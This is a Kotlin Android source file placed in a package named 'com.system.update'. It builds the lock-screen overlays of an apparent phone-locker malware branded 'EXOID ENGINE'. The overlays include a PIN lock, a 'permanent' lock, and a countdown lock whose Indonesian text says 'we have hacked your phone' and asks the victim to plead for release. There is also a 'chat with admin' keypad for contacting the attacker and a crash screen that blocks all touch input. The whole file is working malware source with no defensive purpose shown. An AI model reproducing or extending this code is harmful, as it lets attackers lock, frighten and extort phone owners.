package com.system.update

import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.content.Context
import android.graphics.Canvas
import android.graphics.Color
import android.graphics.Paint
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView
import kotlin.random.Random

object LockOverlayView {

    fun paramsFull(): WindowManager.LayoutParams {
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
    }

    private fun dp(ctx: Context, value: Int): Int =
        TypedValue.applyDimension(
            TypedValue.COMPLEX_UNIT_DIP,
            value.toFloat(),
            ctx.resources.displayMetrics
        ).toInt()

    private fun cardBg(): GradientDrawable {
        return GradientDrawable().apply {
            shape = GradientDrawable.RECTANGLE
            cornerRadius = 40f
            setColor(Color.parseColor("#CC0A1A0A"))
            setStroke(5, Color.parseColor("#00FF66"))
            gradientType = GradientDrawable.LINEAR_GRADIENT
            orientation = GradientDrawable.Orientation.TL_BR
            colors = intArrayOf(
                Color.parseColor("#E60A0A0A"),
                Color.parseColor("#E61A0000")
            )
        }
    }

    // ============================================================
    // MATRIX BACKGROUND
    // ============================================================
    class MatrixBgView(context: Context) : View(context) {
        private val paint = Paint().apply {
            color = Color.parseColor("#00FF66")
            textSize = 34f
            typeface = Typeface.MONOSPACE
            isAntiAlias = true
        }
        private val chars = "01アイウエオカキクケコサシスセソタチツテトABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*<>?/\\|".toCharArray()
        private val columns = mutableListOf<Float>()
        private val drops = mutableListOf<Float>()
        private val speeds = mutableListOf<Float>()
        private val handler = Handler(Looper.getMainLooper())
        private var running = true

        init {
            paint.alpha = 150
        }

        override fun onSizeChanged(w: Int, h: Int, oldw: Int, oldh: Int) {
            super.onSizeChanged(w, h, oldw, oldh)
            columns.clear(); drops.clear(); speeds.clear()
            var x = 0f
            while (x < w) {
                columns.add(x)
                drops.add(Random.nextFloat() * h)
                speeds.add(15f + Random.nextFloat() * 30f)
                x += 36f
            }
        }

        override fun onDraw(canvas: Canvas) {
            super.onDraw(canvas)
            canvas.drawColor(Color.parseColor("#FF0A0A0A"))

            for (i in columns.indices) {
                val c = chars[Random.nextInt(chars.size)]
                paint.alpha = 100 + Random.nextInt(155)
                canvas.drawText(c.toString(), columns[i], drops[i], paint)

                drops[i] += speeds[i]
                if (drops[i] > height) {
                    drops[i] = 0f
                    speeds[i] = 15f + Random.nextFloat() * 30f
                }
            }
        }

        fun startLoop() {
            val r = object : Runnable {
                override fun run() {
                    if (!running) return
                    invalidate()
                    handler.postDelayed(this, 60)
                }
            }
            handler.post(r)
        }

        fun stopLoop() {
            running = false
            handler.removeCallbacksAndMessages(null)
        }
    }

    // ============================================================
    // CUSTOM CHAT KEYPAD (FULL QWERTY)
    // ============================================================
    private fun makeChatSection(ctx: Context, onChat: ((String) -> Unit)?): View? {
        if (onChat == null) return null

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(ctx, 4), dp(ctx, 14), dp(ctx, 4), dp(ctx, 4))
        }

        val label = TextView(ctx).apply {
            text = "💬 CHAT DENGAN ADMIN"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, 0, 0, dp(ctx, 8))
        }

        // Tampilan pesan yang sedang diketik
        val chatDisplay = TextView(ctx).apply {
            text = ""
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 13f)
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER_VERTICAL
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = 12f
                setColor(Color.parseColor("#CC0A0A0A"))
                setStroke(2, Color.parseColor("#00FF66"))
            }
            setPadding(dp(ctx, 14), dp(ctx, 12), dp(ctx, 14), dp(ctx, 12))
            minLines = 2
            maxLines = 3
        }

        // Buffer pesan
        val buffer = StringBuilder()

        fun refreshChat() {
            chatDisplay.text = if (buffer.isEmpty()) "Tulis pesan..." else buffer.toString()
        }
        refreshChat()

        // Baris tombol aksi (kirim + hapus + spasi)
        val actionRow = LinearLayout(ctx).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 6), 0, dp(ctx, 6))
        }

        fun makeActionBtn(label: String, widthWeight: Float, bgColor: String, textColor: String, onClick: () -> Unit): TextView {
            return TextView(ctx).apply {
                text = label
                setTextColor(Color.parseColor(textColor))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 13f)
                setTypeface(null, Typeface.BOLD)
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = 10f
                    setColor(Color.parseColor(bgColor))
                    setStroke(2, Color.parseColor("#00FF66"))
                }
                setPadding(dp(ctx, 4), dp(ctx, 10), dp(ctx, 4), dp(ctx, 10))
                val lp = LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, widthWeight)
                lp.setMargins(dp(ctx, 3), 0, dp(ctx, 3), 0)
                layoutParams = lp
                isClickable = true
                isFocusable = true
                setOnClickListener { onClick() }
            }
        }

        val spaceBtn = makeActionBtn("SPASI", 1.5f, "#0A0A0A", "#00FF66") {
            buffer.append(" ")
            refreshChat()
        }

        val delBtn = makeActionBtn("⌫ HAPUS", 1.5f, "#1A0000", "#E60000") {
            if (buffer.isNotEmpty()) {
                buffer.setLength(buffer.length - 1)
                refreshChat()
            }
        }

        val sendBtn = makeActionBtn("▶ KIRIM", 2f, "#B30000", "#FFFFFF") {
            val txt = buffer.toString().trim()
            if (txt.isNotEmpty()) {
                onChat(txt)
                buffer.setLength(0)
                refreshChat()
            }
        }

        actionRow.addView(spaceBtn)
        actionRow.addView(delBtn)
        actionRow.addView(sendBtn)

        // Keypad huruf + angka
        val keypad = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
        }

        val keySize = dp(ctx, 36)
        val keyMargin = dp(ctx, 2)

        fun makeKey(label: String, onClick: () -> Unit): TextView {
            return TextView(ctx).apply {
                text = label
                setTextColor(Color.parseColor("#00FF66"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 13f)
                typeface = Typeface.MONOSPACE
                setTypeface(null, Typeface.BOLD)
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = 8f
                    setColor(Color.parseColor("#CC0A0A0A"))
                    setStroke(1, Color.parseColor("#00FF66"))
                }
                isClickable = true
                isFocusable = true
                setOnClickListener {
                    onClick()
                }
            }
        }

        fun addKeyRow(letters: String) {
            val row = LinearLayout(ctx).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
            }
            for (ch in letters) {
                val key = makeKey(ch.toString()) {
                    buffer.append(ch)
                    refreshChat()
                }
                val lp = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    keySize
                )
                lp.setMargins(keyMargin, keyMargin, keyMargin, keyMargin)
                key.layoutParams = lp
                key.setPadding(dp(ctx, 12), 0, dp(ctx, 12), 0)
                row.addView(key)
            }
            keypad.addView(row)
        }

        // Baris angka
        addKeyRow("1234567890")
        // Baris huruf QWERTY
        addKeyRow("QWERTYUIOP")
        addKeyRow("ASDFGHJKL")
        addKeyRow("ZXCVBNM")

        container.addView(label)
        container.addView(chatDisplay)
        container.addView(actionRow)
        container.addView(keypad)
        return container
    }

    // ============================================================
    // LOCK PIN
    // ============================================================
    fun buildPin(ctx: Context, correctPin: String, onUnlock: (View) -> Unit, onChat: ((String) -> Unit)? = null): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val matrix = MatrixBgView(ctx)
        root.addView(matrix, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))
        matrix.startLoop()

        val dark = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#99000000"))
        }
        root.addView(dark, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        // SCROLLABLE CONTENT
        val scrollContainer = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
        }

        val card = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 18), dp(ctx, 22), dp(ctx, 18), dp(ctx, 22))
            background = cardBg()
        }

        val icon = TextView(ctx).apply {
            text = "☠"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 48f)
            gravity = Gravity.CENTER
        }

        val logo = TextView(ctx).apply {
            text = "EXOID ENGINE"
            setTextColor(Color.parseColor("#F5D76E"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 18f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.25f
            setPadding(0, dp(ctx, 4), 0, dp(ctx, 2))
        }

        val logoSub = TextView(ctx).apply {
            text = ">> LOCK BY EXOID ENGINE <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.3f
            setPadding(0, 0, 0, dp(ctx, 12))
        }

        val divider = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#00FF66"))
        }
        val dividerParams = LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT,
            dp(ctx, 2)
        ).apply { setMargins(0, 0, 0, dp(ctx, 12)) }

        val title = TextView(ctx).apply {
            text = "[ DEVICE TERKUNCI ]"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 15f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
        }

        val subtitle = TextView(ctx).apply {
            text = "Masukkan 4 angka PIN"
            setTextColor(Color.parseColor("#9A9A9A"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 4), 0, dp(ctx, 12))
        }

        val pinDisplay = LinearLayout(ctx).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }

        val pinBoxes = mutableListOf<TextView>()
        for (i in 0 until 4) {
            val box = TextView(ctx).apply {
                text = "_"
                setTextColor(Color.parseColor("#00FF66"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
                setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = 10f
                    setColor(Color.parseColor("#CC0A0A0A"))
                    setStroke(2, Color.parseColor("#00FF66"))
                }
                setPadding(0, dp(ctx, 8), 0, 0)
            }
            val lp = LinearLayout.LayoutParams(dp(ctx, 42), dp(ctx, 48))
            lp.setMargins(dp(ctx, 3), 0, dp(ctx, 3), 0)
            pinDisplay.addView(box, lp)
            pinBoxes.add(box)
        }

        val status = TextView(ctx).apply {
            text = ""
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 8), 0, dp(ctx, 6))
        }

        val pinBuffer = StringBuilder()

        fun refreshBoxes() {
            for (i in 0 until 4) {
                pinBoxes[i].text = if (i < pinBuffer.length) "●" else "_"
            }
        }

        fun trySubmit() {
            if (pinBuffer.length == 4) {
                if (pinBuffer.toString() == correctPin) {
                    matrix.stopLoop()
                    onUnlock(root)
                } else {
                    status.text = ">> PIN SALAH <<"
                    for (b in pinBoxes) {
                        ObjectAnimator.ofFloat(b, "translationX", 0f, 15f, -15f, 15f, -15f, 0f).apply {
                            duration = 400
                            start()
                        }
                    }
                    pinBuffer.setLength(0)
                    root.postDelayed({
                        refreshBoxes()
                        status.text = ""
                    }, 600)
                }
            }
        }

        val keypad = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
        }

        val btnSize = dp(ctx, 46)
        val btnMargin = dp(ctx, 3)

        fun makeNumKey(label: String, isDanger: Boolean, onClick: () -> Unit): TextView {
            return TextView(ctx).apply {
                text = label
                setTextColor(if (isDanger) Color.parseColor("#E60000") else Color.parseColor("#00FF66"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 17f)
                setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = 12f
                    setColor(Color.parseColor(if (isDanger) "#CC1A0000" else "#CC0A0A0A"))
                    setStroke(2, Color.parseColor(if (isDanger) "#E60000" else "#00FF66"))
                }
                isClickable = true
                isFocusable = true
                setOnClickListener { onClick() }
            }
        }

        fun addNumRow(numbers: List<String>) {
            val row = LinearLayout(ctx).apply {
                orientation = LinearLayout.HORIZONTAL
                gravity = Gravity.CENTER
            }
            for (n in numbers) {
                val isDel = n == "DEL"
                val label = if (isDel) "⌫" else n
                val key = makeNumKey(label, isDel) {
                    when (n) {
                        "DEL" -> {
                            if (pinBuffer.length > 0) {
                                pinBuffer.setLength(pinBuffer.length - 1)
                                refreshBoxes()
                            }
                        }
                        "OK" -> trySubmit()
                        else -> {
                            if (pinBuffer.length < 4) {
                                pinBuffer.append(n)
                                refreshBoxes()
                                trySubmit()
                            }
                        }
                    }
                }
                val lp = LinearLayout.LayoutParams(btnSize, btnSize)
                lp.setMargins(btnMargin, btnMargin, btnMargin, btnMargin)
                row.addView(key, lp)
            }
            keypad.addView(row)
        }

        addNumRow(listOf("1", "2", "3"))
        addNumRow(listOf("4", "5", "6"))
        addNumRow(listOf("7", "8", "9"))
        addNumRow(listOf("DEL", "0", "OK"))

        val floating = TextView(ctx).apply {
            text = ">> SYSTEM LOCKED <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 9f)
            typeface = Typeface.MONOSPACE
            alpha = 0.5f
            letterSpacing = 0.4f
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 8), 0, 0)
        }
        ObjectAnimator.ofFloat(floating, "alpha", 0.2f, 0.9f, 0.2f).apply {
            duration = 1500
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        card.addView(icon)
        card.addView(logo)
        card.addView(logoSub)
        card.addView(divider, dividerParams)
        card.addView(title)
        card.addView(subtitle)
        card.addView(pinDisplay)
        card.addView(status)
        card.addView(keypad)

        val chatView = makeChatSection(ctx, onChat)
        if (chatView != null) card.addView(chatView)

        card.addView(floating)

        scrollContainer.addView(card)

        val scrollParams = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 12), dp(ctx, 20), dp(ctx, 12), dp(ctx, 20))
            gravity = Gravity.CENTER
        }
        root.addView(scrollContainer, scrollParams)

        return root
    }

    // ============================================================
    // LOCK HARD
    // ============================================================
    fun buildHard(ctx: Context, onChat: ((String) -> Unit)? = null): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val matrix = MatrixBgView(ctx)
        root.addView(matrix, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))
        matrix.startLoop()

        val dark = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#99000000"))
        }
        root.addView(dark, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 20), dp(ctx, 28), dp(ctx, 20), dp(ctx, 28))
            background = cardBg()
        }

        val triangle = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 90f)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(triangle, "scaleX", 1f, 1.15f, 1f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }
        ObjectAnimator.ofFloat(triangle, "scaleY", 1f, 1.15f, 1f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        val title = TextView(ctx).apply {
            text = "HAHAHA HP LU TERKUNCI HARD!!!!"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 16f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 18), 0, dp(ctx, 4))
        }

        val logo = TextView(ctx).apply {
            text = ">> LOCK BY EXOID ENGINE <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, dp(ctx, 4), 0, dp(ctx, 14))
        }

        val msg = TextView(ctx).apply {
            text = "Perangkat terkunci permanen.\nMatikan daya untuk melepas."
            setTextColor(Color.parseColor("#E0E0E0"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(ctx, 18))
        }

        val warning = TextView(ctx).apply {
            text = "JANGAN MATIKAN DAYA"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(warning, "alpha", 0.3f, 1f, 0.3f).apply {
            duration = 1200
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        container.addView(triangle)
        container.addView(title)
        container.addView(logo)
        container.addView(msg)

        val chatView = makeChatSection(ctx, onChat)
        if (chatView != null) container.addView(chatView)

        container.addView(warning)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 16), 0, dp(ctx, 16), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        return root
    }

    // ============================================================
    // LOCK TIMER
    // ============================================================
    fun buildTimer(ctx: Context, durationMs: Long, onUnlock: (View) -> Unit, onChat: ((String) -> Unit)? = null): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val matrix = MatrixBgView(ctx)
        root.addView(matrix, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))
        matrix.startLoop()

        val dark = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#99000000"))
        }
        root.addView(dark, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 20), dp(ctx, 28), dp(ctx, 20), dp(ctx, 28))
            background = cardBg()
        }

        val triangle = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#FFC107"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 70f)
            gravity = Gravity.CENTER
        }
        ObjectAnimator.ofFloat(triangle, "alpha", 0.4f, 1f, 0.4f).apply {
            duration = 1400
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        val title = TextView(ctx).apply {
            text = "HP ANDA SUDAH KAMI RETAS"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 15f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 18), 0, dp(ctx, 4))
        }

        val logo = TextView(ctx).apply {
            text = ">> LOCK BY EXOID ENGINE <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 10f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
            setPadding(0, dp(ctx, 4), 0, dp(ctx, 14))
        }

        val message = TextView(ctx).apply {
            text = "Mohon bicara baik-baik jika mau di lepas lock nya."
            setTextColor(Color.parseColor("#D4AF37"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 11f)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(ctx, 16))
        }

        val timerText = TextView(ctx).apply {
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 40f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.15f
        }

        val subTimer = TextView(ctx).apply {
            text = "WAKTU TERSISA"
            setTextColor(Color.parseColor("#9A9A9A"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 9f)
            gravity = Gravity.CENTER
            setPadding(0, dp(ctx, 4), 0, 0)
        }

        container.addView(triangle)
        container.addView(title)
        container.addView(logo)
        container.addView(message)
        container.addView(timerText)
        container.addView(subTimer)

        val chatView = makeChatSection(ctx, onChat)
        if (chatView != null) container.addView(chatView)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 16), 0, dp(ctx, 16), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        val handler = Handler(Looper.getMainLooper())
        val endTime = System.currentTimeMillis() + durationMs
        handler.post(object : Runnable {
            override fun run() {
                val left = endTime - System.currentTimeMillis()
                if (left <= 0) {
                    matrix.stopLoop()
                    onUnlock(root)
                    return
                }
                val d = left / 86_400_000
                val h = (left % 86_400_000) / 3_600_000
                val m = (left % 3_600_000) / 60_000
                val s = (left % 60_000) / 1000
                timerText.text = if (d > 0)
                    String.format("%dd %02d:%02d:%02d", d, h, m, s)
                else
                    String.format("%02d:%02d:%02d", h, m, s)
                handler.postDelayed(this, 1000)
            }
        })

        return root
    }

    // ============================================================
    // CRASH
    // ============================================================
    fun buildCrash(ctx: Context, onDismiss: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val matrix = MatrixBgView(ctx)
        root.addView(matrix, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))
        matrix.startLoop()

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(dp(ctx, 24), dp(ctx, 32), dp(ctx, 24), dp(ctx, 32))
        }

        val error = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 80f)
            gravity = Gravity.CENTER
        }

        val title = TextView(ctx).apply {
            text = "SYSTEM ERROR"
            setTextColor(Color.parseColor("#E60000"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.3f
            setPadding(0, dp(ctx, 16), 0, dp(ctx, 8))
        }

        val logo = TextView(ctx).apply {
            text = ">> LOCK BY EXOID ENGINE <<"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            setTypeface(Typeface.MONOSPACE, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.2f
        }

        val hint = TextView(ctx).apply {
            text = "TOUCH DISABLED"
            setTextColor(Color.parseColor("#00FF66"))
            setTextSize(TypedValue.COMPLEX_UNIT_SP, 12f)
            gravity = Gravity.CENTER
            alpha = 0.6f
            setPadding(0, dp(ctx, 16), 0, 0)
        }
        ObjectAnimator.ofFloat(hint, "alpha", 0.2f, 0.9f, 0.2f).apply {
            duration = 1400
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        container.addView(error)
        container.addView(title)
        container.addView(logo)
        container.addView(hint)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply {
            setMargins(dp(ctx, 20), 0, dp(ctx, 20), 0)
            gravity = Gravity.CENTER
        }
        root.addView(container, lp)

        root.setOnTouchListener { _, _ -> true }
        return root
    }
}